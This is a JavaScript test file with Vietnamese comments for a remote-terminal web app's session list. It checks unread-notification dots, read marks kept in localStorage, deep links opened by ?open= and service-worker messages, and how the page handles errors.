  assert.ok(dotOf(card), 'phải có chấm chưa đọc');
  assert.equal(card.classList.contains('has-unread'), true);
  assert.equal(titleOf(card), 'cc-remote-control', 'tên vẫn phải là span cuối');
});

test('thông báo cũ hơn mốc đã đọc → không có chấm', async () => {
  const box = { sessions: [SESSION_ALIVE], notes: [{ ...NOTE_BASE, sessionId: 's-1', at: 1000 }] };
  const { context, byId, localStorage } = loadAppPage({ fetchImpl: makeFetchBoth(box) });
  localStorage.setItem('ccrc_read_s-1', '2000'); // đã xem sau thông báo đó
  await pairMachine(context, SESSION_ALIVE.machine);
  await refreshBoth(context);

  assert.equal(dotOf(byId['terminal-list'].children[0]), undefined);
  assert.equal(byId['terminal-list'].children[0].classList.contains('has-unread'), false);
});

test('thông báo đúng mốc đã đọc (bằng nhau) → coi như đã đọc', async () => {
  const box = { sessions: [SESSION_ALIVE], notes: [{ ...NOTE_BASE, sessionId: 's-1', at: 2000 }] };
  const { context, byId, localStorage } = loadAppPage({ fetchImpl: makeFetchBoth(box) });
  localStorage.setItem('ccrc_read_s-1', '2000');
  await pairMachine(context, SESSION_ALIVE.machine);
  await refreshBoth(context);

  assert.equal(dotOf(byId['terminal-list'].children[0]), undefined,
    'so sánh phải là > chứ không >=, nếu không mở xong vẫn còn chấm');
});

test('thông báo của phiên KHÁC không làm phiên này sáng chấm', async () => {
  const box = { sessions: [SESSION_ALIVE], notes: [{ ...NOTE_BASE, sessionId: 's-2', at: 1000 }] };
  const { context, byId } = loadAppPage({ fetchImpl: makeFetchBoth(box) });
  await pairMachine(context, SESSION_ALIVE.machine);
  await refreshBoth(context);

  assert.equal(dotOf(byId['terminal-list'].children[0]), undefined);
});

test('thông báo không thuộc phiên nào (không có sessionId) không sáng chấm ở đâu cả', async () => {
  const box = { sessions: [SESSION_ALIVE], notes: [{ ...NOTE_BASE, at: 1000 }] };
  const { context, byId } = loadAppPage({ fetchImpl: makeFetchBoth(box) });
  await pairMachine(context, SESSION_ALIVE.machine);
  await refreshBoth(context);

  assert.equal(dotOf(byId['terminal-list'].children[0]), undefined);
});

test('phiên không phản hồi vẫn sáng chấm — thông báo đã đến là chuyện có thật', async () => {
  const box = { sessions: [SESSION_DEAD], notes: [{ ...NOTE_BASE, sessionId: 's-1', at: 1000 }] };
  const { context, byId } = loadAppPage({ fetchImpl: makeFetchBoth(box) });
  await refreshBoth(context);

  const card = byId['terminal-list'].children[0];
  assert.ok(dotOf(card), 'máy ngủ không có nghĩa là không có việc chờ mình');
  assert.equal(openButtonOf(card), undefined, 'vẫn không được dựng nút mở');
});

// --- Ba đường đánh dấu đã đọc ----------------------------------------------

test('bấm "Mở terminal" → phiên đó coi như đã đọc, lần dựng sau hết chấm', async () => {
  const box = { sessions: [SESSION_ALIVE], notes: [{ ...NOTE_BASE, sessionId: 's-1', at: 1000 }] };
  const { context, byId, localStorage, sessionStorage, location } =
    loadAppPage({ fetchImpl: makeFetchBoth(box) });
  await pairMachine(context, SESSION_ALIVE.machine);
  await refreshBoth(context);
  assert.ok(dotOf(byId['terminal-list'].children[0]), 'tiền đề: đang có chấm');

  await openButtonOf(byId['terminal-list'].children[0]).onclick();

  assert.match(location.href, /#t=/, 'tiền đề: đã thực sự điều hướng đi');
  assert.ok(Number(localStorage.getItem('ccrc_read_s-1')) > 0, 'phải ghi mốc đã đọc');
  assert.equal(sessionStorage.getItem('ccrc_opened'), 's-1', 'phải nhớ để lần quay về đánh dấu tiếp');

  await refreshBoth(context);
  assert.equal(dotOf(byId['terminal-list'].children[0]), undefined);
});

test('ký hỏng (chưa ghép) → KHÔNG được coi là đã đọc', async () => {
  const box = { sessions: [SESSION_ALIVE], notes: [{ ...NOTE_BASE, sessionId: 's-1', at: 1000 }] };
  // Cùng một `brokenCrypto` với test 'ký thất bại (IndexedDB/WebCrypto lỗi)…'
  // ở trên — giữ y hệt để hai test không lệch nhau về bộ phương thức mà
  // ensureDeviceKey()/rememberMachine() cần.
  const brokenCrypto = {
    getRandomValues: (arr) => webcrypto.getRandomValues(arr),
    subtle: {
      generateKey: (...a) => webcrypto.subtle.generateKey(...a),
      exportKey: (...a) => webcrypto.subtle.exportKey(...a),
      digest: (...a) => webcrypto.subtle.digest(...a),
      verify: (...a) => webcrypto.subtle.verify(...a),
      sign: () => { throw new Error('ký giả lập thất bại'); },
    },
  };
  const { context, byId, localStorage, sessionStorage } =
    loadAppPage({ fetchImpl: makeFetchBoth(box), cryptoImpl: brokenCrypto });
  await pairMachine(context, SESSION_ALIVE.machine);
  await refreshBoth(context);

  await openButtonOf(byId['terminal-list'].children[0]).onclick();

  assert.equal(localStorage.getItem('ccrc_read_s-1'), null, 'không mở được thì không mất chấm');
  assert.equal(sessionStorage.getItem('ccrc_opened'), null);
  assert.ok(dotOf(byId['terminal-list'].children[0]), 'chấm phải còn nguyên');
});

test('quay về từ terminal → thông báo đến TRONG LÚC đang xem cũng coi là đã đọc', async () => {
  const box = { sessions: [SESSION_ALIVE], notes: [] };
  const { context, byId } = loadAppPage({ fetchImpl: makeFetchBoth(box) });
  await pairMachine(context, SESSION_ALIVE.machine);
  await refreshBoth(context);
  await openButtonOf(byId['terminal-list'].children[0]).onclick();

  // Hub vẫn GHI thông báo vào lịch sử trong lúc mình xem terminal (nó chỉ nén
  // push) — đây chính là thứ sẽ sáng chấm oan nếu thiếu bước đánh dấu lúc về.
  box.notes = [{ ...NOTE_BASE, sessionId: 's-1', at: Date.now() }];
  await refreshBoth(context);

  assert.equal(dotOf(byId['terminal-list'].children[0]), undefined,
    'vừa xem xong quay ra mà vẫn thấy chấm là sai');
});

test('đóng app rồi mở lại → thông báo đến sau đó VẪN sáng chấm', async () => {
  const box = { sessions: [SESSION_ALIVE], notes: [] };
  const { context, byId, sessionStorage } = loadAppPage({ fetchImpl: makeFetchBoth(box) });
  await pairMachine(context, SESSION_ALIVE.machine);
  await refreshBoth(context);
  await openButtonOf(byId['terminal-list'].children[0]).onclick();

  // Đóng app: sessionStorage chết theo tab, localStorage thì không. Đây đúng
  // là lý do dấu "vừa mở phiên nào" không được đặt trong localStorage.
  sessionStorage.removeItem('ccrc_opened');
  box.notes = [{ ...NOTE_BASE, sessionId: 's-1', at: Date.now() + 60_000 }];
  await refreshBoth(context);

  assert.ok(dotOf(byId['terminal-list'].children[0]),
    'thông báo đến sau khi rời đi không được bị nuốt mất');
});

test('chạm vào thẻ phiên không phản hồi → tắt chấm ngay, không cần fetch lại', async () => {
  const box = { sessions: [SESSION_DEAD], notes: [{ ...NOTE_BASE, sessionId: 's-1', at: 1000 }] };
  const { context, byId, localStorage } = loadAppPage({ fetchImpl: makeFetchBoth(box) });
  await refreshBoth(context);

  const card = byId['terminal-list'].children[0];
  assert.ok(dotOf(card), 'tiền đề: đang có chấm');
  assert.equal(openButtonOf(card), undefined, 'tiền đề: không có nút nào để bấm');

  card.onclick();

  assert.equal(dotOf(card), undefined, 'chấm phải biến mất tại chỗ');
  assert.equal(card.classList.contains('has-unread'), false);
  assert.ok(Number(localStorage.getItem('ccrc_read_s-1')) > 0);
});

test('thẻ không có chấm thì không gắn onclick — không có gì để chạm cả', async () => {
  const box = { sessions: [SESSION_DEAD], notes: [] };
  const { context, byId } = loadAppPage({ fetchImpl: makeFetchBoth(box) });
  await refreshBoth(context);

  assert.equal(byId['terminal-list'].children[0].onclick, null);
});

// --- Quay lại trang phải nạp lại CẢ HAI danh sách ---------------------------

test('pageshow nạp lại danh sách → chấm sáng lên mà không phải gọi tay', async () => {
  const box = { sessions: [SESSION_ALIVE], notes: [] };
  const { context, byId, window } = loadAppPage({ fetchImpl: makeFetchBoth(box) });
  await pairMachine(context, SESSION_ALIVE.machine);
  byId['main'].classList.remove('hidden'); // đã đăng nhập
  await refreshBoth(context);
  assert.equal(dotOf(byId['terminal-list'].children[0]), undefined, 'tiền đề: chưa có gì');

  // Trong lúc app nằm nền, một thông báo về.
  box.notes = [{ ...NOTE_BASE, sessionId: 's-1', at: Date.now() }];
  await Promise.all(window.dispatch('pageshow', { persisted: true }));

  assert.ok(dotOf(byId['terminal-list'].children[0]),
    'mốc đi kèm phiên, nên một lần nạp /api/terminal phải đủ để chấm sáng');
});

// --- Dọn mốc đã đọc của những phiên không còn nữa ---------------------------
//
// Mỗi lần `/remote on` sinh một sessionId mới, nên không dọn thì localStorage
// tích một khoá vĩnh viễn cho mỗi phiên từng chạy trong đời máy này.

test('mốc đã đọc của phiên không còn trong danh sách bị xoá', async () => {
  const box = { sessions: [SESSION_ALIVE], notes: [] };
  const { context, byId, localStorage } = loadAppPage({ fetchImpl: makeFetchBoth(box) });
  localStorage.setItem('ccrc_read_s-1', '1');        // phiên đang chạy
  localStorage.setItem('ccrc_read_s-cu', '1');       // không ai nhắc tới nữa
  localStorage.setItem('ccrc_token', 'giu-nguyen');  // không thuộc tiền tố này

  await pairMachine(context, SESSION_ALIVE.machine);
  await refreshBoth(context);

  assert.equal(localStorage.getItem('ccrc_read_s-1'), '1', 'phiên đang chạy phải giữ mốc');
  // Danh sách phiên giờ là nguồn DUY NHẤT quyết định giữ hay xoá. Trước đây
  // lịch sử thông báo trên hub cũng bỏ phiếu — một phiên đã đóng mà còn thông
  // báo trong lịch sử thì mốc của nó vẫn được giữ. Không còn lịch sử thì cũng
  // không còn ai bỏ phiếu ấy, và điều đó đúng: mốc chỉ ảnh hưởng tới cái chấm
  // trên một cái thẻ, mà thẻ thì đến từ đúng danh sách này.
  assert.equal(localStorage.getItem('ccrc_read_s-cu'), null, 'khoá mồ côi phải bị xoá');
  assert.equal(localStorage.getItem('ccrc_token'), 'giu-nguyen', 'không được đụng khoá khác');
  assert.equal(byId['terminal-list'].children.length, 1, 'danh sách vẫn dựng bình thường');
});

test('nhiều khoá mồ côi liền nhau đều bị xoá — không bỏ sót vì chỉ số trượt', async () => {
  const box = { sessions: [], notes: [] };
  const { context, localStorage } = loadAppPage({ fetchImpl: makeFetchBoth(box) });
  for (const id of ['a', 'b', 'c', 'd']) localStorage.setItem('ccrc_read_' + id, '1');

  await refreshBoth(context);

  assert.equal(localStorage.length, 0, 'xoá giữa vòng lặp key(i) là cách bỏ sót kinh điển');
});

// --- fragment CHỈ mang token, không gì khác ---------------------------------
//
// Đây là một khẳng định về TƯƠNG THÍCH NGƯỢC, không phải về hình thức. Hub và
// từng máy dev cập nhật độc lập nhau, nên một PWA mới luôn có lúc gặp một
// `term.js` cũ — và bản cũ đọc token bằng regex tham lam `/^#t=(.+)$/`. Thêm
// bất cứ tham số nào vào sau token là nó nuốt luôn vào trong token: daemon từ
// chối chữ ký, và điện thoại quay vòng "đang nối lại…" mà không nói được vì
// sao. Hub origin (`&h=`) từng nằm ở đây, cho một cơ chế điều hướng cử chỉ
// back về danh sách phiên — cơ chế đó đã bị gỡ hẳn (xem term.js).
test('bấm Mở terminal: fragment CHỈ có t=<token>, không thêm tham số nào', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_ALIVE] } }));
  const { context, byId, location } = loadAppPage({ fetchImpl });
  await pairMachine(context, SESSION_ALIVE.machine);
  await context.refreshTerminal();
  const card = byId['terminal-list'].children[0];
  await openButtonOf(card).onclick();

  const hash = location.href.slice(location.href.indexOf('#') + 1);
  assert.ok(hash.startsWith('t='), 'fragment phải bắt đầu bằng t=, đã có: ' + hash);
  assert.equal(hash.includes('&'), false,
    'một tham số thứ hai trong fragment làm term.js bản cũ đọc sai token: ' + hash);
  assert.ok(new URLSearchParams(hash).get('t'), 'phải có token trong fragment');
});

// --- bấm thông báo → mở thẳng terminal của phiên đó (spec §3) --------------

test('?open=<sid> → tự mở đúng phiên, và xoá tham số khỏi thanh địa chỉ', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_ALIVE] } }));
  const { context, location, replaceCalls } = loadAppPage({ fetchImpl, search: '?open=s-1' });
  await pairMachine(context, SESSION_ALIVE.machine);
  await context.refreshTerminal();

  assert.equal(replaceCalls.length, 1, 'phải xoá ?open= ngay khi đọc xong');
  assert.ok(location.href.startsWith('http://100.86.1.2:8730/#t='),
    'phải điều hướng thẳng vào terminal, đã có ' + location.href);
});

test('?open= tiêu thụ đúng một lần — refresh lần hai không mở lại', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_ALIVE] } }));
  const { context, byId, location } = loadAppPage({ fetchImpl, search: '?open=s-1' });
  await pairMachine(context, SESSION_ALIVE.machine);
  await context.refreshTerminal();
  location.href = '';           // giả lập "đã đi rồi, giờ quay lại"
  await context.refreshTerminal();
  assert.equal(location.href, '', 'lần refresh sau không được tự điều hướng lần nữa');
  // Không chỉ "không điều hướng" — phải là vì pendingOpen đã tiêu thụ hết,
  // không phải vì lần refresh thứ hai đi vào một nhánh lỗi nào đó rồi tình
  // cờ cũng không điều hướng. terminal-err còn ẩn mới đúng là lý do đó.
  assert.equal(byId['terminal-err'].classList.contains('hidden'), true,
    'lần refresh sau phải trôi qua êm, không phải im lặng vì lỗi khác');
});

test('?open= trỏ tới phiên không còn trong danh sách → nói rõ phiên đã đóng', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_ALIVE_2] } }));
  const { context, byId, location } = loadAppPage({ fetchImpl, search: '?open=s-khong-ton-tai' });
  await pairMachine(context, 'may-dev');
  await context.refreshTerminal();
  assert.equal(location.href, '', 'không được điều hướng đi đâu cả');
  assert.equal(byId['terminal-err'].classList.contains('hidden'), false);
  assert.match(byId['terminal-err'].textContent, /đã đóng/);
});

test('?open= trỏ tới phiên máy không phản hồi → nói rõ, không điều hướng', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_DEAD] } }));
  const { context, byId, location } = loadAppPage({ fetchImpl, search: '?open=s-1' });
  await pairMachine(context, SESSION_DEAD.machine);
  await context.refreshTerminal();
  assert.equal(location.href, '');
  assert.match(byId['terminal-err'].textContent, /không phản hồi/);
});

test('?open= nhưng máy chưa ghép → chỉ đúng việc cần làm, không ký gì', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_ALIVE] } }));
  const { context, byId, location } = loadAppPage({ fetchImpl, search: '?open=s-1' });
  // KHÔNG gọi pairMachine — đây chính là điều đang được kiểm.
  await context.refreshTerminal();
  assert.equal(location.href, '');
  assert.match(byId['terminal-err'].textContent, /Ghép máy này/);
});

test('GET /api/terminal hỏng → giữ nguyên yêu cầu mở, không kết luận phiên đã đóng', async () => {
  let lan = 0;
  const fetchImpl = makeFetch(async (url) => {
    // Đếm riêng lượt gọi /api/terminal — script còn tự bắn /api/auth/config
    // ngay lúc nạp trang (kiểm tra có Slack login hay không), không liên
    // quan gì tới bài kiểm này, nhưng vẫn đi qua cùng một fetch giả lập.
    if (url !== '/api/terminal') return { status: 404, body: {} };
    lan += 1;
    if (lan === 1) throw new Error('network down');
    return { status: 200, body: { sessions: [SESSION_ALIVE] } };
  });
  const { context, byId, location } = loadAppPage({ fetchImpl, search: '?open=s-1' });
  await pairMachine(context, SESSION_ALIVE.machine);
  await context.refreshTerminal();
  assert.match(byId['terminal-err'].textContent, /Không lấy được trạng thái/);
  await context.refreshTerminal();
  assert.ok(location.href.startsWith('http://100.86.1.2:8730/#t='),
    'lượt sau thành công thì yêu cầu mở phải vẫn còn hiệu lực');
});

// --- postMessage({type:'ccrc_open'}) — lối vào khi trang đã đang chạy sẵn --
//
// Đây mới là lối chính theo Task 5: `?open=` chỉ là lối DỰ PHÒNG dùng khi
// service worker phải MỞ CỬA SỔ MỚI vì chưa có cửa sổ nào đang chạy. Khi PWA
// đã mở sẵn — trường hợp phổ biến nhất — service worker gửi thẳng
// postMessage vào cửa sổ đó thay vì điều hướng gì cả. dom-harness.mjs cố ý
// không gắn `serviceWorker` vào navigator mặc định (để refreshPushState() ở
// nhánh "không hỗ trợ"), nên khối test này phải tự dựng một
// navigator.serviceWorker giả qua `navigatorImpl` — cách duy nhất để đường
// mã này thật sự CHẠY trong test, chứ không chỉ được đọc mắt.
function makeSwNavigator({ startMessages = true } = {}) {
  const listeners = {};
  const started = { count: 0 };
  const sw = {
    // Bottom-of-file `navigator.serviceWorker.register('sw.js').catch(...)`
    // chạy ngay khi app.js nạp xong nếu 'serviceWorker' in navigator —
    // phải trả về một promise để .catch() không ném ngay lúc tải trang.
    register: async () => ({}),
    addEventListener(type, fn) { (listeners[type] = listeners[type] || []).push(fn); },
  };
  // Có mặt trong mọi trình duyệt thật; `startMessages: false` dựng một trình
  // duyệt cũ không có nó, để chứng minh app.js không gọi bừa.
  if (startMessages) sw.startMessages = () => { started.count += 1; };
  return {
    navigatorImpl: { serviceWorker: sw },
    started,
    // Đồng bộ, giống dispatchEvent thật: gọi thẳng mọi listener đã đăng ký
    // cho 'message', với `{data}` — đúng hình dạng MessageEvent mà app.js đọc
    // qua `ev.data`.
    dispatchMessage(data) { (listeners.message || []).forEach((fn) => fn({ data })); },
  };
}

test('postMessage ccrc_open từ service worker → mở đúng phiên, không cần ?open=', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_ALIVE] } }));
  const { navigatorImpl, dispatchMessage } = makeSwNavigator();
  const { context, byId, location } = loadAppPage({ fetchImpl, navigatorImpl });
  // Đã đăng nhập — đúng cảnh mà lối này phục vụ, và là thứ làm cho khẳng định
  // bên dưới nói về LISTENER: còn ở màn hình đăng nhập thì listener cố ý
  // không tự nạp lại gì cả (xem test ngay sau đây).
  byId['main'].classList.remove('hidden');
  await pairMachine(context, SESSION_ALIVE.machine);
  // Dựng danh sách/thẻ TRƯỚC — đúng cảnh thật: trang đã đang mở, danh sách đã
  // có sẵn khi thông báo tới. consumePendingOpen() cần thẻ đó để lấy nút bấm.
  await context.refreshTerminal();

  dispatchMessage({ type: 'ccrc_open', sessionId: SESSION_ALIVE.sessionId });
  // Listener của app.js gọi refreshTerminal() nhưng không AI await nó (đúng
  // như một event handler thật) — gọi lại refreshTerminal() từ đây chỉ nhận
  // về CHÍNH promise đó (coalescing), nên await được tới lúc nó xong.
  await context.refreshTerminal();

  assert.ok(location.href.startsWith('http://100.86.1.2:8730/#t='),
    'phải điều hướng thẳng vào terminal, đã có ' + location.href);
});

// Thông báo có thể tới lúc app đang mở nhưng CHƯA đăng nhập (token hết hạn,
// vừa đăng xuất). Gọi refreshTerminal() ở đó sẽ 401 → logout() → rồi vẽ câu
// lỗi lên một phần tử nằm trong #main đang ẩn: cú bấm của người dùng trông
// như không làm gì cả. Yêu cầu mở phải được GIỮ LẠI, không phải vứt đi.
test('ccrc_open lúc còn ở màn hình đăng nhập → không gọi hub, và giữ yêu cầu cho lần đăng nhập sau', async () => {
  let terminalCalls = 0;
  const fetchImpl = makeFetch(async (url) => {
    if (url === '/api/terminal') { terminalCalls += 1; return { status: 200, body: { sessions: [SESSION_ALIVE] } }; }
    throw new Error('unexpected url ' + url);
  });
  const { navigatorImpl, dispatchMessage } = makeSwNavigator();
  const { context, byId, location } = loadAppPage({ fetchImpl, navigatorImpl });
  await pairMachine(context, SESSION_ALIVE.machine);
  byId['main'].classList.add('hidden'); // vẫn ở màn hình đăng nhập

  dispatchMessage({ type: 'ccrc_open', sessionId: SESSION_ALIVE.sessionId });
  await Promise.resolve();
  assert.equal(terminalCalls, 0, 'không được hỏi hub bằng một token đã hỏng — 401 sẽ đá người dùng ra');
  assert.equal(location.href, '', 'chưa đăng nhập thì chưa đi đâu cả');

  // Đăng nhập xong: showMain() kết thúc bằng đúng refreshTerminal() này, và
  // yêu cầu mở còn nguyên nên nó được nhặt lên ngay lượt đó.
  byId['main'].classList.remove('hidden');
  await context.refreshTerminal();
  assert.ok(location.href.startsWith('http://100.86.1.2:8730/#t='),
    'yêu cầu mở phải sống sót qua lần đăng nhập, đã có: ' + location.href);
});

// app.js là script cổ điển, không `async`, nên listener 'message' được gắn
// trước khi trình duyệt bơm hàng đợi tin nhắn — hôm nay nó chạy được là nhờ
// đúng điều đó. Thêm `async` vào thẻ <script> sau này sẽ âm thầm làm rơi mọi
// `ccrc_open` đã xếp hàng trước khi script kịp chạy. startMessages() là thứ
// biến chỗ dựa ngầm ấy thành một lời yêu cầu tường minh.
test('gọi startMessages() sau khi gắn listener — không phụ thuộc vào việc script không async', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [] } }));
  const { navigatorImpl, started } = makeSwNavigator();
  loadAppPage({ fetchImpl, navigatorImpl });
  assert.equal(started.count, 1);
});

test('trình duyệt không có startMessages() → không gọi bừa, trang vẫn nạp', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_ALIVE] } }));
  const { navigatorImpl, dispatchMessage } = makeSwNavigator({ startMessages: false });
  const { context, byId, location } = loadAppPage({ fetchImpl, navigatorImpl });
  byId['main'].classList.remove('hidden');
  await pairMachine(context, SESSION_ALIVE.machine);
  await context.refreshTerminal();

  dispatchMessage({ type: 'ccrc_open', sessionId: SESSION_ALIVE.sessionId });
  await context.refreshTerminal();
  assert.ok(location.href.startsWith('http://100.86.1.2:8730/#t='),
    'thiếu startMessages() thì vẫn phải chạy như cũ, đã có: ' + location.href);
});

test('postMessage với type sai, thiếu sessionId, hoặc sessionId không phải chuỗi → bỏ qua, không mở gì', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_ALIVE] } }));
  const { navigatorImpl, dispatchMessage } = makeSwNavigator();
  const { context, byId, location } = loadAppPage({ fetchImpl, navigatorImpl });
  // Đã đăng nhập, để lý do "không mở gì" chỉ có thể là payload — chứ không
  // phải cái chặn "còn ở màn hình đăng nhập" ở trên.
  byId['main'].classList.remove('hidden');
  await pairMachine(context, SESSION_ALIVE.machine);
  await context.refreshTerminal();

  dispatchMessage({ type: 'khong_phai_ccrc_open', sessionId: SESSION_ALIVE.sessionId });
  dispatchMessage({ type: 'ccrc_open' });                       // thiếu sessionId
  dispatchMessage({ type: 'ccrc_open', sessionId: 12345 });     // không phải chuỗi
  dispatchMessage(null);                                        // ev.data không tồn tại

  // refreshTerminal() thủ công ở đây không tự mở gì (không có postMessage hợp
  // lệ nào đặt pendingOpen) — chỉ dùng để chắc chắn không có gì đang treo lại
  // mở muộn ở lượt sau.
  await context.refreshTerminal();
  assert.equal(location.href, '', 'không có payload nào ở trên là hợp lệ — không được điều hướng đi đâu cả');
});

test('phiên không có nhãn: tên là tên máy, và KHÔNG lặp lại nó ở dòng phụ', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_KHONG_NHAN] } }));
  const { context, byId } = loadAppPage({ fetchImpl });
  await pairMachine(context, SESSION_KHONG_NHAN.machine);
  await context.refreshTerminal();
  const card = byId['terminal-list'].children[0];
  assert.equal(titleOf(card), 'may-dev');
  assert.equal(metaOf(card), undefined, 'lặp lại tên máy ngay dưới chính nó là chữ thừa');
});

test('máy không phản hồi: giữ nguyên từng chữ của câu dùng chung, không rút gọn', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_DEAD] } }));
  const { context, byId } = loadAppPage({ fetchImpl });
  await context.refreshTerminal();
  const card = byId['terminal-list'].children[0];
  assert.equal(openButtonOf(card), undefined, 'máy chết thì không dựng nút nào');
  assert.match(noteOf(card).textContent, /có thể đã ngủ/,
    'vế "có thể đã ngủ" là thứ nói cho người dùng biết phải làm gì — không được rút gọn đi');
});

test('máy chưa ghép: dòng phụ nói rõ, nút đổi thành Ghép máy này', async () => {
  const fetchImpl = makeFetch(async () => ({ status: 200, body: { sessions: [SESSION_ALIVE] } }));
  const { context, byId } = loadAppPage({ fetchImpl });   // KHÔNG gọi pairMachine
  await context.refreshTerminal();
  const card = byId['terminal-list'].children[0];
  assert.match(metaOf(card).textContent, /chưa ghép với máy này/);
  assert.equal(openButtonOf(card).textContent, 'Ghép máy này');
});
